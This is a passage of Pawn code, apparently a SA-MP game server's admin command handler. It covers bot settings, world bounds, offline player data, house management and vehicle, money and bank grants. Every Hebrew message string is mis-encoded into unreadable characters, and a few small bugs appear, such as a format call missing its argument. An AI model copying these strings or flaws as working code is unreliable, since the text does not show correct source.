			if(equal(cmd,"None")) return SendClientMessage(playerid,red," .ьр Ёщ·я ь∙Ёх· р· ыщЁхщ фсхш ьыщЁхщ цф");
			if(strlen(cmd) > MAX_PLAYER_NAME) return SendClientMessage(playerid,red," .∙э р°хъ юущ");
			if(strlen(cmd) < 3) return SendClientMessage(playerid,red," .∙э ўЎ° юущ");
			if(!IsValidNick(cmd)) return SendClientMessage(playerid,red," .∙э ∙тхщ / ф∙э ьр ф∙·Ёф");
			for(new i=0;i<MAX_PLAYERS_;i++)
			{
				if(IsPlayerConnected(i) && equal(GetName(i),cmd))
				{
					format(string,sizeof(string)," .фыщЁхщ ∙фўьу· ыс° с∙щюх∙ рЎь рщщущ %d",i);
					SendClientMessage(playerid,red,string);
					return 1;
				}
			}
			SetString(botname,cmd);
			format(string,sizeof(string)," .%s ∙э фсхш ∙хЁф ь",botname);
			SendClientMessage(playerid,green,string);
		}
		else if(equal(cmd,"color"))
		{
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /bot color [red] [green] [blue] :Ўх°· ф∙щюх∙");
			new rgb[3];
			rgb[0] = strval(cmd);
			for(new i=1;i<3;i++) cmd = strtok(cmdtext,idx), rgb[i] = !strlen(cmd) || !IsNumeric(cmd)? rgb[i-1]:strval(cmd);
			botcolor = rgba2hex(rgb[0],rgb[1],rgb[2],255);
			SendClientMessage(playerid,botcolor," .ЎсЄ фсхш ∙хЁф ьЎсЄ ффхуЄф фцр·");
		}
		else if(equal(cmd,"allow"))
		{
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /bot allow [on/off] :Ўх°· ф∙щюх∙");
			if(equal(cmd,"on"))
			{
				boton = 1;
				SendClientMessage(playerid,green," .фсхш фхЇЄь");
				PlaySound(playerid,1057);
			}
			else if(equal(cmd,"off"))
			{
				boton = 0;
				SendClientMessage(playerid,green," .фсхш ыхсф");
				PlaySound(playerid,1057);
			}
			else return SendClientMessage(playerid,red," .рЇ∙°х· ∙тхщф");
		}
		else return SendClientMessage(playerid,red," .Їўху· схш ∙тхщф");
		AdminInfo(playerid,cmdtext);
		return 1;
	}
	if(equal(cmd,"/wbound") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 10 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 10");
		new string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /wbound [action] :Ўх°· ф∙щюх∙");
			SendClientMessage(playerid,white," /wbound set [id/name] [size] :щЎщ°· ∙уф тсхь");
			return SendClientMessage(playerid,white," /wbound remove [id/name] :ючщў· ∙уф тсхь");
		}
		if(equal(cmd,"set"))
		{
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /wbound set [id/name] [size] :Ўх°· ф∙щюх∙");
			new id = ReturnUser(cmd,playerid), Float:p[3], Float:s;
			if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
			if(!CommandAllowed(playerid,id,cmdtext)) return 1;
			GetPlayerPos(id,p[0],p[1],p[2]);
			cmd = strtok(cmdtext,idx), s = !strlen(cmd) ? 25.0 : float(strval(cmd));
			if((s < 5.0 || s > 200.0) && !playerinfo[playerid][pp]) return SendClientMessage(playerid,red," .тхуь ф∙уф ∙тхщ");
			SetPlayerWorldBounds(id,p[0] + s,p[0] - s,p[1] + s,p[1] - s);
			format(string,sizeof(string)," .фрующя щЎ° ёсщсъ ∙уф тсхь стхуь %.1f",s);
			SendClientMessage(id,green,string);
			format(string,sizeof(string)," .∙уф тсхь стхуь %.1f %s щЎ°· ёсщс",s,GetName(id));
			SendClientMessage(playerid,green,string);
		}
		else if(equal(cmd,"remove"))
		{
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /wbound remove [id/name] :Ўх°· ф∙щюх∙");
			new id = ReturnUser(cmd,playerid);
			if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
			if(!CommandAllowed(playerid,id,cmdtext)) return 1;
			SetPlayerWorldBounds(id,20000.0,-20000.0,20000.0,-20000.0);
			SendClientMessage(id,green," .фрующя ючў р· ∙уф фтсхь ∙ьъ");
			format(string,sizeof(string)," .%s ючў· р· ∙уф фтсхь ∙ьу",GetName(id));
			SendClientMessage(playerid,green,string);
		}
		else return SendClientMessage(playerid,red," .рЇ∙°х· ∙тхщф");
		AdminInfo(playerid,cmdtext);
		return 1;
	}
	if(equal(cmd,"/noupdate") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 10 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 10");
		new string[M_S], id, nope;
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /noupdate [id/name] [on/off] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		cmd = strtok(cmdtext,idx);
		if(equal(cmd,"on")) nope = 1;
		else if(equal(cmd,"off")) nope = 0;
		else return SendClientMessage(playerid,red," .рЇ∙°х· ∙тхщф");
		format(string,sizeof(string)," .%s %s ЄуыхЁщэ ь",GetName(id),nope ? ("чёю·") : ("рщЇ∙°·"));
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," .фрующя %s ьъ ЄуыхЁщэ",nope ? ("чёэ") : ("рщЇ∙°"));
		SendClientMessage(id,green,string);
		playerinfo[id][noupdate] = nope;
		AdminInfo(playerid,cmdtext);
		return 1;
	}
	if(equal(cmd,"/savedata") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 10 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 10");
		new string[M_S], cmd2[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd))
		{
			SendClientMessage(playerid,white," /savedata [action] :Ўх°· ф∙щюх∙");
			SendClientMessage(playerid,white," /savedata money [username] [amount] :∙ющ°· ыёє ь∙чўя");
			SendClientMessage(playerid,white," /savedata message [username] [text] :∙ющ°· фхуЄф ь∙чўя");
			SendClientMessage(playerid,white," /savedata show [username] :ЎЇщщф сЇ°шщэ ф∙юх°щэ ∙ь ю∙·ю∙");
			SendClientMessage(playerid,white," /savedata reset [username] :рщЇхё фЇ°шщэ ф∙юх°щэ ∙ь ю∙·ю∙");
			SendClientMessage(playerid,white," /savedata ban [username] [message] :(∙ющ°· фхуЄ· ф∙Єщщф (сЁЄщь· ю∙·ю∙ рх ссря");
			return 1;
		}
		if(equal(cmd,"money"))
		{
			if(playerinfo[playerid][admin] < 15) return SendClientMessage(playerid,red," .ь∙щюх∙ сЇўхуф цх Єьщъ ьфщх· ьЇчх· с°ю· рующя 15");
			cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
			if(!strlen(cmd) || !strlen(cmd2) || !IsNumeric(cmd2)) return SendClientMessage(playerid,white," /savedata money [username] [amount]");
			new id = ReturnUser(cmd,playerid);
			if(IsPlayerConnected(id)) return SendClientMessage(playerid,red," .фю∙·ю∙ фцф ючхс° ь∙°·");
			format(string,sizeof(string),"/DM/Users/%s.ini",cmd);
			if(!fexist(string)) return SendClientMessage(playerid,red," .ю∙·ю∙ ьр ўщщэ");
			if(strval(cmd2) < 1 || strval(cmd2) > 999999999) return SendClientMessage(playerid,red," .ёыхэ ыёє ∙тхщ");
			if(!SaveData("money",playerid,cmd,cmd2)) SendClientMessage(playerid,red," .рщя рЇ∙°х· ь∙юх° фхуЄф ью∙·ю∙ цф: щ∙ рЎьх щх·° юущ фхуЄх· ∙юх°х·");
			else SendClientMessage(playerid,white,"Done");
		}
		else if(equal(cmd,"message"))
		{
			cmd = strtok(cmdtext,idx), cmd2 = strrest(cmdtext,idx);
			if(!strlen(cmd) || !strlen(cmd2)) return SendClientMessage(playerid,white," /savedata message [username] [text]");
			new id = ReturnUser(cmd,playerid);
			if(IsPlayerConnected(id)) return SendClientMessage(playerid,red," .фю∙·ю∙ фцф ючхс° ь∙°·");
			format(string,sizeof(string),"/DM/Users/%s.ini",cmd);
			if(!fexist(string)) return SendClientMessage(playerid,red," .ю∙·ю∙ ьр ўщщэ");
			if(!SaveData("message",playerid,cmd,cmd2)) SendClientMessage(playerid,red," .рщя рЇ∙°х· ь∙юх° фхуЄф ью∙·ю∙ цф: щ∙ рЎьх щх·° юущ фхуЄх· ∙юх°х·");
			else SendClientMessage(playerid,white,"Done");
		}
		else if(equal(cmd,"ban"))
		{
			cmd = strtok(cmdtext,idx), cmd2 = strrest(cmdtext,idx);
			if(!strlen(cmd) || !strlen(cmd2)) return SendClientMessage(playerid,white," /savedata ban [username] [message]");
			new id = ReturnUser(cmd,playerid);
			if(IsPlayerConnected(id)) return SendClientMessage(playerid,red," .фю∙·ю∙ фцф ючхс° ь∙°·");
			format(string,sizeof(string),"/DM/Users/%s.ini",cmd);
			if(!fexist(string)) return SendClientMessage(playerid,red," .ю∙·ю∙ ьр ўщщэ");
			if(!SaveData("ban",playerid,cmd,cmd2)) SendClientMessage(playerid,red," .рщя рЇ∙°х· ь∙юх° фхуЄф ью∙·ю∙ цф: щ∙ рЎьх щх·° юущ фхуЄх· ∙юх°х·");
			else SendClientMessage(playerid,white,"Done");
		}
		else if(equal(cmd,"show"))
		{
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /savedata show [username]");
			new id = ReturnUser(cmd,playerid);
			if(IsPlayerConnected(id)) return SendClientMessage(playerid,red," .фю∙·ю∙ фцф ючхс° ь∙°·");
			format(string,sizeof(string),"/DM/Users/%s.ini",cmd);
			if(!fexist(string)) return SendClientMessage(playerid,red," .ю∙·ю∙ ьр ўщщэ");
			format(cmd2,sizeof(cmd2),"/DM/Info/Last/LastInfo_%s.ini",cmd);
			if(!fexist(cmd2)) return SendClientMessage(playerid,red," .ью∙·ю∙ цф рщя ющуЄ ∙юх°");
			format(string,sizeof(string)," ~~~ :%s - ющуЄ ∙юх° ~~~");
			SendClientMessage(playerid,lightblue,string);
			for(new i = 1; i <= MAX_SAVED_DATA; i++)
			{
				format(string,sizeof(string),"GM%03dAmount",i);
				if(fkeyexist(cmd2,string))
				{
					if(i == 1) SendClientMessage(playerid,lightblue," ~~~ :ыёє ~~~");
					format(string,sizeof(string)," :∙юх°щэ $%d юфёщсф",fgetint(cmd2,string));
					SendClientMessage(playerid,setAlpha(green,250),string);
					format(string,sizeof(string),"GM%03dText",i);
					SendClientMessage(playerid,setAlpha(green,250),fgetstring(cmd2,string));
				}
			}
			for(new i = 1; i <= MAX_SAVED_DATA; i++)
			{
				format(string,sizeof(string),"Msg%03dSender",i);
				format(cmd,sizeof(cmd),"Msg%03dText",i);
				if(fkeyexist(cmd2,string) && fkeyexist(cmd2,cmd))
				{
					if(i == 1) SendClientMessage(playerid,lightblue," ~~~ :фхуЄх· ∙юх°х· ~~~");
					format(string,sizeof(string),"(%s) %s",fgetstring(cmd2,string),fgetstring(cmd2,cmd));
					SendClientMessage(playerid,setAlpha(green,200),string);
				}
			}
		}
		else if(equal(cmd,"reset"))
		{
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /savedata reset [username]");
			new id = ReturnUser(cmd,playerid);
			if(IsPlayerConnected(id)) return SendClientMessage(playerid,red," .фю∙·ю∙ фцф ючхс° ь∙°·");
			format(string,sizeof(string),"/DM/Users/%s.ini",cmd);
			if(!fexist(string)) return SendClientMessage(playerid,red," .ю∙·ю∙ ьр ўщщэ");
			format(cmd2,sizeof(cmd2),"/DM/Info/Last/LastInfo_%s.ini",cmd);
			if(!fexist(cmd2)) return SendClientMessage(playerid,red," .ью∙·ю∙ цф рщя ющуЄ ∙юх°");
			fremove(cmd2);
			format(string,sizeof(string)," .Ёючў %s фющуЄ ф∙юх° ∙ь",cmd);
			SendClientMessage(playerid,green,string);
		}
		else return SendClientMessage(playerid,red," .рЇ∙°х· ∙тхщф");
		return 1;
	}
	if(equal(cmd,"/edithousesize") && IsPlayerMAdmin(playerid))
	{
	    if((playerinfo[playerid][admin] < 17 && playerid != ConsoleID) && !PlayerHasRank(playerid,RankID("юЁфьщ с·щэ"))) return SendClientMessage(playerid,red," .17 Єьщъ ьфщх· ьЇчх· с°ю· рующя");
	    new hs,string[M_S],hid;
	    cmd = strtok(cmdtext,idx);
	    if(!strlen(cmd)) return SendClientMessage(playerid,white,"/edithousesize [house id] [size / default = 1] :Ўх°· ф∙щюх∙");
	    hid = strval(cmd);
	    format(string,sizeof(string),"%s%d.ini",folder_houses,hid);
	    if(!fexist(string)) return SendClientMessage(playerid,red," .юёЇ° сщ· ∙тхщ");
	    cmd = strtok(cmdtext,idx);
		hs = !strlen(cmd) ? 1 : strval(cmd);
		if(hs < 1 || hs > 5) return SendClientMessage(playerid,red," .тхуь ∙тхщ");
		houseinfo[hid][hsize] = hs, houseinfo[hid][hcost] = hs*1000000;
		PlaySound(playerid,1149);
		format(string,sizeof(string)," .%d$ тхуь юёЇ° сщ· %d ф∙·Ёф ь %d хыЄ· фючщ° ∙ьх фхр",hs*1000000,hid,hs);
		return SendClientMessage(playerid,green,string);
	}
	if((equal(cmd,"/deletehouse") || equal(cmd,"/dh")) && IsPlayerMAdmin(playerid))
	{
 		if((playerinfo[playerid][admin] < 17 && playerid != ConsoleID) && !PlayerHasRank(playerid,RankID("юЁфьщ с·щэ"))) return SendClientMessage(playerid,red," .17 Єьщъ ьфщх· ьЇчх· с°ю· рующя");
 		new hid,string[M_S],f[M_S];
 		cmd = strtok(cmdtext,idx);
 		if(!strlen(cmd)) return SendClientMessage(playerid,white," /deletehouse(dh) [house id] :Ўх°· ф∙щюх∙");
 		hid = strval(cmd);
 		format(string,sizeof(string),"%s%d.ini",folder_houses,hid);
 		if(!fexist(string)) return SendClientMessage(playerid,red," .юёЇ° сщ· ∙тхщ");
		for(new i = 0; i < MAX_HOUSE_KEYS; i++)
		{
			format(f,sizeof(f),"Acc%d",i);
			if(fkeyexist(f,string)) fremovekey(string,f);
		}
		format(f,sizeof(f),"%s",fgetstring(string,"Owner"));
		if(!equal(f,"None"))
		{
		    for(new _i = 0; _i < MAX_PLAYERS_; _i++) if(IsPlayerConnected(_i) && equal(GetName(_i),f))
		    {
		        SendClientMessage(_i,red," .фрующя ючў р· сщ·ъ");
		        playerinfo[_i][houseid] = -1;
		        break;
		    }
		    format(f,sizeof(f),"%s%s.ini",folder_users,f);
		    fsetint(f,"PlayerHouse2",-1);
		}
		fsetstring(string,"Owner","None");
		DestroyPickupEx(houseinfo[hid][hpickup]);
		PlaySound(playerid,1149);
		format(string,sizeof(string)," .%d ючў· р· сщ· юёЇ°",hid);
		return SendClientMessage(playerid,green,string);
	}
	if((equal(cmd,"/movehouse") || equal(cmd,"/mh")) && IsPlayerMAdmin(playerid))
	{
	    if((playerinfo[playerid][admin] < 17 && playerid != ConsoleID) && !PlayerHasRank(playerid,RankID("юЁфьщ с·щэ"))) return SendClientMessage(playerid,red," .17 Єьщъ ьфщх· ьЇчх· с°ю· рующя");
	    new hid,string[M_S],Float:p[3],vid = INVALID_VEHICLE_ID;
	    cmd = strtok(cmdtext,idx);
	    if(!strlen(cmd)) return SendClientMessage(playerid,white," /movehouse(mh) [house id] :Ўх°· ф∙щюх∙");
	    hid = strval(cmd);
	    format(string,sizeof(string),"%s%d.ini",folder_houses,hid);
	    if(!fexist(string)) return SendClientMessage(playerid,red," .юёЇ° сщ· ∙тхщ");
		if(GetPlayerInterior(playerid) != 0) return SendClientMessage(playerid,red," .ьр Ёщ·я ьфЄсщ° р· ющўхэ фсщ· ьрщЁш°щх°");
		vid = GetPlayerVehicleID(playerid);
		if(IsPlayerInAnyVehicle(playerid)) GetVehiclePos(vid,p[0],p[1],p[2]);
		else GetPlayerPos(playerid,p[0],p[1],p[2]);
		//for(new _i = 0; _i < 3; _i++) houseinfo[hid][hPosition][_i] = p[_i];
		houseinfo[hid][hx] = p[0];
		houseinfo[hid][hy] = p[1];
		houseinfo[hid][hz] = p[2];
		DestroyPickupEx(houseinfo[hid][hpickup]);
		houseinfo[hid][hpickup] = CreatePickupEx(1272,1,p[0],p[1],p[2],8);
		fsetfloat(string,"X",p[0]),fsetfloat(string,"Y",p[1]),fsetfloat(string,"Z",p[2]);
		PlaySound(playerid,1149);
		format(string,sizeof(string)," .%d фцц· ьющўхюъ р· сщ· юёЇ°",hid);
		return SendClientMessage(playerid,green,string);
	}
	if((equal(cmd,"/telehouse") || equal(cmd,"/th")) && IsPlayerMAdmin(playerid))
	{
	    if((playerinfo[playerid][admin] < 17 && playerid != ConsoleID) && !PlayerHasRank(playerid,RankID("юЁфьщ с·щэ"))) return SendClientMessage(playerid,red," .17 Єьщъ ьфщх· ьЇчх· с°ю· рующя");
	    new hid,string[M_S];
	    cmd = strtok(cmdtext,idx);
	    if(!strlen(cmd)) return SendClientMessage(playerid,white," /telehouse(th) [house id] :Ўх°· ф∙щюх∙");
		hid = strval(cmd);
		format(string,sizeof(string),"%s%d.ini",folder_houses,hid);
		if(!fexist(string)) return SendClientMessage(playerid,red," .юёЇ° сщ· ∙тхщ");
		SetPlayerPos(playerid,houseinfo[hid][hx],houseinfo[hid][hy],houseinfo[hid][hz]);
		PlaySound(playerid,1149);
		format(string,sizeof(string)," .%d ф∙·т°· рь сщ· юёЇ°",hid);
		return SendClientMessage(playerid,green,string);
	}
	if(equal(cmd,"/givecar") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 17 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 17");
		new cmd2[M_S], id, amount, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || !IsNumeric(cmd2)) return SendClientMessage(playerid,white," /givecar [id/name] [Vehicle Model ID(400-661)] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		amount = strval(cmd2);
		if(amount < 400 || amount > 661) return SendClientMessage(playerid,red," .ю40 Єу 661");
		format(string,sizeof(string)," .%d р· ф°ыс %s Ё·· ь",amount,GetName(id));
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," .%d ўщсь· юфрующя р· °ыс юёЇ°",amount);
		SendClientMessage(id,green,string);
        fsetint(fuser(id),"PVehicle",amount);
        fsetint(fuser(playerid),"VehicleCost",0);
        playerinfo[id][vehicle][0] = fgetint(fuser(id),"PVehicle");
		return 1;
	}
	if(equal(cmd,"/givecar2") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 17 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 17");
		new cmd2[M_S], id, amount, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || !IsNumeric(cmd2)) return SendClientMessage(playerid,white," /givecar2 [id/name] [Vehicle Model ID(400-661)] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		amount = strval(cmd2);
		if(amount < 400 || amount > 661) return SendClientMessage(playerid,red," .ю40 Єу 661");
		format(string,sizeof(string)," .%d р· ф°ыс %s Ё·· ь",amount,GetName(id));
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," .%d ўщсь· юфрующя р· °ыс юёЇ°",amount);
		SendClientMessage(id,green,string);
        fsetint(fuser(id),"PVehicle2",amount);
        fsetint(fuser(playerid),"Vehicle2Cost",0);
        playerinfo[id][vehicle][3] = fgetint(fuser(id),"PVehicle2");
		return 1;
	}
	if(equal(cmd,"/givecar3") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 17 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 17");
		new cmd2[M_S], id, amount, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || !IsNumeric(cmd2))
		{
			SendClientMessage(playerid,white," /givecar3 [id/name] [Vehicle Model ID] :Ўх°· ф∙щюх∙");
			for(new i = 0; i < sizeof(SpecialThirdVehicle); i++)
			{
				format(string,sizeof(string)," ID %d = %s",SpecialThirdVehicle[i][stvModel],SpecialThirdVehicle[i][stvName]);
				SendClientMessage(playerid,green,string);
			}
			return 1;
		}
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		amount = strval(cmd2);
		new stv = -1;
		for(new i = 0; i < sizeof(SpecialThirdVehicle) && stv == -1; i++) if(SpecialThirdVehicle[i][stvModel] == amount) stv = i;
		if(stv == -1) return SendClientMessage(playerid,red," .рщщущ ьр чхўщ");
		format(string,sizeof(string)," .%d р· ф°ыс %s Ё·· ь",amount,GetName(id));
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," .%d ўщсь· юфрующя р· °ыс юёЇ°",amount);
		SendClientMessage(id,green,string);
        fsetint(fuser(id),"PVehicle3",amount);
        fsetint(fuser(playerid),"VehicleCost3",0);
        playerinfo[id][vehicle][5] = fgetint(fuser(id),"PVehicle3");
		return 1;
	}
	if((equal(cmd,"/gm") || equal(cmd,"/givemoney")) && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 17 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 17");
		new cmd2[M_S], id, amount, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || !IsNumeric(cmd2)) return SendClientMessage(playerid,white," /givemoney(gm) [id/name] [money] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		amount = strval(cmd2);
		if(amount < 1 || amount > 99999999) return SendClientMessage(playerid,red," .ёыхэ фыёє ∙фўьу· тухь юущ рх ўшя юущ");
		if(playerinfo[playerid][paytimer][2] > -1) return SendClientMessage(playerid,red," .р·ф ыс° срюЎЄ ∙ьщч· ыёє, рЁр фю·я ∙фщр ·ё·щщэ");
		SetTimerPck(playerinfo[playerid][paytimer][0],"PayTimer",PAY_TIME * 1000,0,"iiii",playerid,playerinfo[playerid][paytimer][1] = id,amount,playerinfo[playerid][paytimer][2] = 1);
		format(string,sizeof(string)," .(/sgm :фыёє щ∙ьч сЄху %d ∙Ёщх·, ьсщшхь ф∙ьщчф) %s ∙ьч· юфрующя %d$ ь",PAY_TIME,GetName(id),amount);
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string),"using /gm: attending to send money (%d)%s [%d$]",id,GetName(id),amount);
		Log("Attention",playerid,string);
		return 1;
	}
 	if(equal(cmd,"/sgm"))
 	{
		if(playerinfo[playerid][paytimer][2] != 1) return SendClientMessage(playerid,red," .р·ф ьр срюЎЄ ∙ьщч· ыёє юфрующя");
		new string[M_S];
		KillTimer(playerinfo[playerid][paytimer][0]);
		format(string,sizeof(string)," .%s сщшь· р· ∙ьщч· фыёє юфрующя рь",GetName(playerinfo[playerid][paytimer][1]));
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string),"using /sgm: stopped sending money to (%d)%s",playerinfo[playerid][paytimer][1],GetName(playerinfo[playerid][paytimer][1]));
		Log("Attention",playerid,string);
		playerinfo[playerid][paytimer][1] = INVALID_PLAYER_ID, playerinfo[playerid][paytimer][2] = -1;
		return 1;
	}
	if((equal(cmd,"/sm") || equal(cmd,"/setmoney")) && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 17 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 17");
		new cmd2[M_S], id, amount, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || !IsNumeric(cmd2)) return SendClientMessage(playerid,white," /setmoney(sm) [id/name] [money] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		amount = strval(cmd2);
		if(amount < 0 || amount > 99999999) return SendClientMessage(playerid,red," .ёыхэ фыёє ∙фўьу· тухь юущ рх ўшя юущ");
		format(string,sizeof(string)," .ь %d$ %s ∙щЁщ· р· ыёЇх ∙ь",amount,GetName(id));
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," .фрующя ∙щЁф р· ыёЇъ ь %d$",amount);
		SendClientMessage(id,green,string);
		format(string,sizeof(string),"sm (%d)%s [%d$]",id,GetName(id),amount);
		Log("Attention",playerid,string);
		GiveMoney(id,amount-GetMoney(id));
		return 1;
	}
	if(equal(cmd,"/removemoney") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 17 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 17");
		new cmd2[M_S], id, amount, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || !IsNumeric(cmd2)) return SendClientMessage(playerid,white," /removemoney [id/name] [money] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		amount = strval(cmd2);
		if(amount < 1 || amount > 99999999) return SendClientMessage(playerid,red," .ёыхэ фыёє ∙фўьу· тухь юущ рх ўшя юущ");
		format(string,sizeof(string)," .%s фх°у· %d$ ю",GetName(id),amount);
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," .фрующя фх°щу ююъ %d$",amount);
		SendClientMessage(id,green,string);
		GiveMoney(id,0-amount);
		return 1;
	}
	if(equal(cmd,"/givebank") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 17 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 17");
		new cmd2[M_S], id, amount, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || !IsNumeric(cmd2)) return SendClientMessage(playerid,white," /givebank [id/name] [money] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		amount = strval(cmd2);
		if(amount < 1 || amount > 99999999) return SendClientMessage(playerid,red," .ёыхэ фыёє ∙фўьу· тухь юущ рх ўшя юущ");
		format(string,sizeof(string)," .%s ∙ьч· %d$ ьсЁў ь",GetName(id),amount);
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," .ўщсь· юфрующя %d$ ьсЁў",amount);
		SendClientMessage(id,green,string);
		format(string,sizeof(string),"givebank (%d)%s [%d$]",id,GetName(id),amount);
		Log("Attention",playerid,string);
		playerinfo[id][bank] += amount;
		if(playerinfo[id][logged]) fsetint(fuser(id),"Bank",playerinfo[id][bank]);
		new str[M_S];
		format(str, sizeof(str), "[admincmd] givebank to %s: %d$", GetName(id), amount);
		Log("Money", playerid, str);
		return 1;
	}
	if(equal(cmd,"/setbank") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 17 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 17");
		new cmd2[M_S], id, amount, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || !IsNumeric(cmd2)) return SendClientMessage(playerid,white," /setbank [id/name] [money] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		amount = strval(cmd2);
		if(amount < 0 || amount > 99999999) return SendClientMessage(playerid,red," .ёыхэ фыёє ∙фўьу· тухь юущ рх ўшя юущ");
		format(string,sizeof(string)," .ь %d$ %s ∙щЁщ· р· фыёє ссЁў ∙ь",amount,GetName(id));
